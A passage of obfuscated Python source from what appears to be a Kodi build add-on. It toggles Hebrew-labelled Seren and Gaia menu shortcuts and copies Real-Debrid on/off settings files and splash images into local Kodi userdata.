    O0OOOOOO00O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:560
    with open (O0OOOOOO00O0O00O0 ,'r')as O0OO00000O0OO00OO :#line:561
      OOO0O0O0O00OO00OO =O0OO00000O0OO00OO .read ()#line:562
    OOO0O0O0O00OO00OO =OOO0O0O0O00OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:580
    with open (O0OOOOOO00O0O00O0 ,'w')as O0OO00000O0OO00OO :#line:583
      O0OO00000O0OO00OO .write (OOO0O0O0O00OO00OO )#line:584
    O0OOOOOO00O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:587
    with open (O0OOOOOO00O0O00O0 ,'r')as O0OO00000O0OO00OO :#line:588
      OOO0O0O0O00OO00OO =O0OO00000O0OO00OO .read ()#line:589
    OOO0O0O0O00OO00OO =OOO0O0O0O00OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:607
    with open (O0OOOOOO00O0O00O0 ,'w')as O0OO00000O0OO00OO :#line:610
      O0OO00000O0OO00OO .write (OOO0O0O0O00OO00OO )#line:611
    O0OOOOOO00O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:613
    with open (O0OOOOOO00O0O00O0 ,'r')as O0OO00000O0OO00OO :#line:614
      OOO0O0O0O00OO00OO =O0OO00000O0OO00OO .read ()#line:615
    OOO0O0O0O00OO00OO =OOO0O0O0O00OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:633
    with open (O0OOOOOO00O0O00O0 ,'w')as O0OO00000O0OO00OO :#line:636
      O0OO00000O0OO00OO .write (OOO0O0O0O00OO00OO )#line:637
    O0OOOOOO00O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:639
    with open (O0OOOOOO00O0O00O0 ,'r')as O0OO00000O0OO00OO :#line:640
      OOO0O0O0O00OO00OO =O0OO00000O0OO00OO .read ()#line:641
    OOO0O0O0O00OO00OO =OOO0O0O0O00OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:659
    with open (O0OOOOOO00O0O00O0 ,'w')as O0OO00000O0OO00OO :#line:662
      O0OO00000O0OO00OO .write (OOO0O0O0O00OO00OO )#line:663
    O0OOOOOO00O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:666
    with open (O0OOOOOO00O0O00O0 ,'r')as O0OO00000O0OO00OO :#line:667
      OOO0O0O0O00OO00OO =O0OO00000O0OO00OO .read ()#line:668
    OOO0O0O0O00OO00OO =OOO0O0O0O00OO00OO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:686
    with open (O0OOOOOO00O0O00O0 ,'w')as O0OO00000O0OO00OO :#line:689
      O0OO00000O0OO00OO .write (OOO0O0O0O00OO00OO )#line:690
def rdbuildinstall ():#line:693
  try :#line:694
   OOOO0OO000O00O00O =(ADDON .getSetting ("rdbuild"))#line:695
   if OOOO0OO000O00O00O =='true':#line:696
     OOOO000OOO00OOOO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:697
     OOO00OO0O0O0O000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:698
     copyfile (OOOO000OOO00OOOO0 ,OOO00OO0O0O0O000O )#line:699
  except :#line:700
     pass #line:701
def rdbuildaddonoff ():#line:704
    OOOO00OOOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:707
    with open (OOOO00OOOO0OO0O0O ,'r')as O0OOO0O00OOOOO0O0 :#line:708
      OO00OOOOOO0O0000O =O0OOO0O00OOOOO0O0 .read ()#line:709
    OO00OOOOOO0O0000O =OO00OOOOOO0O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:727
    with open (OOOO00OOOO0OO0O0O ,'w')as O0OOO0O00OOOOO0O0 :#line:730
      O0OOO0O00OOOOO0O0 .write (OO00OOOOOO0O0000O )#line:731
    OOOO00OOOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:735
    with open (OOOO00OOOO0OO0O0O ,'r')as O0OOO0O00OOOOO0O0 :#line:736
      OO00OOOOOO0O0000O =O0OOO0O00OOOOO0O0 .read ()#line:737
    OO00OOOOOO0O0000O =OO00OOOOOO0O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:755
    with open (OOOO00OOOO0OO0O0O ,'w')as O0OOO0O00OOOOO0O0 :#line:758
      O0OOO0O00OOOOO0O0 .write (OO00OOOOOO0O0000O )#line:759
    OOOO00OOOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:763
    with open (OOOO00OOOO0OO0O0O ,'r')as O0OOO0O00OOOOO0O0 :#line:764
      OO00OOOOOO0O0000O =O0OOO0O00OOOOO0O0 .read ()#line:765
    OO00OOOOOO0O0000O =OO00OOOOOO0O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:783
    with open (OOOO00OOOO0OO0O0O ,'w')as O0OOO0O00OOOOO0O0 :#line:786
      O0OOO0O00OOOOO0O0 .write (OO00OOOOOO0O0000O )#line:787
    OOOO00OOOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:791
    with open (OOOO00OOOO0OO0O0O ,'r')as O0OOO0O00OOOOO0O0 :#line:792
      OO00OOOOOO0O0000O =O0OOO0O00OOOOO0O0 .read ()#line:793
    OO00OOOOOO0O0000O =OO00OOOOOO0O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:811
    with open (OOOO00OOOO0OO0O0O ,'w')as O0OOO0O00OOOOO0O0 :#line:814
      O0OOO0O00OOOOO0O0 .write (OO00OOOOOO0O0000O )#line:815
    OOOO00OOOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:818
    with open (OOOO00OOOO0OO0O0O ,'r')as O0OOO0O00OOOOO0O0 :#line:819
      OO00OOOOOO0O0000O =O0OOO0O00OOOOO0O0 .read ()#line:820
    OO00OOOOOO0O0000O =OO00OOOOOO0O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:838
    with open (OOOO00OOOO0OO0O0O ,'w')as O0OOO0O00OOOOO0O0 :#line:841
      O0OOO0O00OOOOO0O0 .write (OO00OOOOOO0O0000O )#line:842
    OOOO00OOOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:844
    with open (OOOO00OOOO0OO0O0O ,'r')as O0OOO0O00OOOOO0O0 :#line:845
      OO00OOOOOO0O0000O =O0OOO0O00OOOOO0O0 .read ()#line:846
    OO00OOOOOO0O0000O =OO00OOOOOO0O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:864
    with open (OOOO00OOOO0OO0O0O ,'w')as O0OOO0O00OOOOO0O0 :#line:867
      O0OOO0O00OOOOO0O0 .write (OO00OOOOOO0O0000O )#line:868
    OOOO00OOOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:870
    with open (OOOO00OOOO0OO0O0O ,'r')as O0OOO0O00OOOOO0O0 :#line:871
      OO00OOOOOO0O0000O =O0OOO0O00OOOOO0O0 .read ()#line:872
    OO00OOOOOO0O0000O =OO00OOOOOO0O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:890
    with open (OOOO00OOOO0OO0O0O ,'w')as O0OOO0O00OOOOO0O0 :#line:893
      O0OOO0O00OOOOO0O0 .write (OO00OOOOOO0O0000O )#line:894
    OOOO00OOOO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:897
    with open (OOOO00OOOO0OO0O0O ,'r')as O0OOO0O00OOOOO0O0 :#line:898
      OO00OOOOOO0O0000O =O0OOO0O00OOOOO0O0 .read ()#line:899
    OO00OOOOOO0O0000O =OO00OOOOOO0O0000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:917
    with open (OOOO00OOOO0OO0O0O ,'w')as O0OOO0O00OOOOO0O0 :#line:920
      O0OOO0O00OOOOO0O0 .write (OO00OOOOOO0O0000O )#line:921
def rdbuildinstalloff ():#line:924
    try :#line:925
       OO00OOO00O000OO0O =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:926
       O000OOO0O0OOO00O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:927
       copyfile (OO00OOO00O000OO0O ,O000OOO0O0OOO00O0 )#line:929
       OO00OOO00O000OO0O =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:931
       O000OOO0O0OOO00O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:932
       copyfile (OO00OOO00O000OO0O ,O000OOO0O0OOO00O0 )#line:934
       OO00OOO00O000OO0O =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:936
       O000OOO0O0OOO00O0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:937
       copyfile (OO00OOO00O000OO0O ,O000OOO0O0OOO00O0 )#line:939
       OO00OOO00O000OO0O =ADDONPATH +"/resources/rdoff/Splash.png"#line:942
       O000OOO0O0OOO00O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:943
       copyfile (OO00OOO00O000OO0O ,O000OOO0O0OOO00O0 )#line:945
    except :#line:947
       pass #line:948
def rdbuildaddonON ():#line:955
    O000O0OOOO0OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:957
    with open (O000O0OOOO0OO00OO ,'r')as OO0OO0OOOOOO00O0O :#line:958
      OOO0OO00O0O00000O =OO0OO0OOOOOO00O0O .read ()#line:959
    OOO0OO00O0O00000O =OOO0OO00O0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:977
    with open (O000O0OOOO0OO00OO ,'w')as OO0OO0OOOOOO00O0O :#line:980
      OO0OO0OOOOOO00O0O .write (OOO0OO00O0O00000O )#line:981
    O000O0OOOO0OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:985
    with open (O000O0OOOO0OO00OO ,'r')as OO0OO0OOOOOO00O0O :#line:986
      OOO0OO00O0O00000O =OO0OO0OOOOOO00O0O .read ()#line:987
    OOO0OO00O0O00000O =OOO0OO00O0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1005
    with open (O000O0OOOO0OO00OO ,'w')as OO0OO0OOOOOO00O0O :#line:1008
      OO0OO0OOOOOO00O0O .write (OOO0OO00O0O00000O )#line:1009
    O000O0OOOO0OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1013
    with open (O000O0OOOO0OO00OO ,'r')as OO0OO0OOOOOO00O0O :#line:1014
      OOO0OO00O0O00000O =OO0OO0OOOOOO00O0O .read ()#line:1015
    OOO0OO00O0O00000O =OOO0OO00O0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1033
    with open (O000O0OOOO0OO00OO ,'w')as OO0OO0OOOOOO00O0O :#line:1036
      OO0OO0OOOOOO00O0O .write (OOO0OO00O0O00000O )#line:1037
    O000O0OOOO0OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1041
    with open (O000O0OOOO0OO00OO ,'r')as OO0OO0OOOOOO00O0O :#line:1042
      OOO0OO00O0O00000O =OO0OO0OOOOOO00O0O .read ()#line:1043
    OOO0OO00O0O00000O =OOO0OO00O0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1061
    with open (O000O0OOOO0OO00OO ,'w')as OO0OO0OOOOOO00O0O :#line:1064
      OO0OO0OOOOOO00O0O .write (OOO0OO00O0O00000O )#line:1065
    O000O0OOOO0OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1068
    with open (O000O0OOOO0OO00OO ,'r')as OO0OO0OOOOOO00O0O :#line:1069
      OOO0OO00O0O00000O =OO0OO0OOOOOO00O0O .read ()#line:1070
    OOO0OO00O0O00000O =OOO0OO00O0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1088
    with open (O000O0OOOO0OO00OO ,'w')as OO0OO0OOOOOO00O0O :#line:1091
      OO0OO0OOOOOO00O0O .write (OOO0OO00O0O00000O )#line:1092
    O000O0OOOO0OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1094
    with open (O000O0OOOO0OO00OO ,'r')as OO0OO0OOOOOO00O0O :#line:1095
      OOO0OO00O0O00000O =OO0OO0OOOOOO00O0O .read ()#line:1096
    OOO0OO00O0O00000O =OOO0OO00O0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1114
    with open (O000O0OOOO0OO00OO ,'w')as OO0OO0OOOOOO00O0O :#line:1117
      OO0OO0OOOOOO00O0O .write (OOO0OO00O0O00000O )#line:1118
    O000O0OOOO0OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1120
    with open (O000O0OOOO0OO00OO ,'r')as OO0OO0OOOOOO00O0O :#line:1121
      OOO0OO00O0O00000O =OO0OO0OOOOOO00O0O .read ()#line:1122
    OOO0OO00O0O00000O =OOO0OO00O0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1140
    with open (O000O0OOOO0OO00OO ,'w')as OO0OO0OOOOOO00O0O :#line:1143
      OO0OO0OOOOOO00O0O .write (OOO0OO00O0O00000O )#line:1144
    O000O0OOOO0OO00OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1147
    with open (O000O0OOOO0OO00OO ,'r')as OO0OO0OOOOOO00O0O :#line:1148
      OOO0OO00O0O00000O =OO0OO0OOOOOO00O0O .read ()#line:1149
    OOO0OO00O0O00000O =OOO0OO00O0O00000O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1167
    with open (O000O0OOOO0OO00OO ,'w')as OO0OO0OOOOOO00O0O :#line:1170
      OO0OO0OOOOOO00O0O .write (OOO0OO00O0O00000O )#line:1171
def rdbuildinstallON ():#line:1174
    try :#line:1176
       O0O0O0O0OO000O0OO =ADDONPATH +"/resources/rd/victory.xml"#line:1177
       OOOOO000O0O0000O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1178
       copyfile (O0O0O0O0OO000O0OO ,OOOOO000O0O0000O0 )#line:1180
       O0O0O0O0OO000O0OO =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1182
       OOOOO000O0O0000O0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1183
       copyfile (O0O0O0O0OO000O0OO ,OOOOO000O0O0000O0 )#line:1185
       O0O0O0O0OO000O0OO =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1187
       OOOOO000O0O0000O0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1188
       copyfile (O0O0O0O0OO000O0OO ,OOOOO000O0O0000O0 )#line:1190
       O0O0O0O0OO000O0OO =ADDONPATH +"/resources/rd/Splash.png"#line:1193
       OOOOO000O0O0000O0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1194
       copyfile (O0O0O0O0OO000O0OO ,OOOOO000O0O0000O0 )#line:1196
    except :#line:1198
       pass #line:1199
def rdbuild ():#line:1209
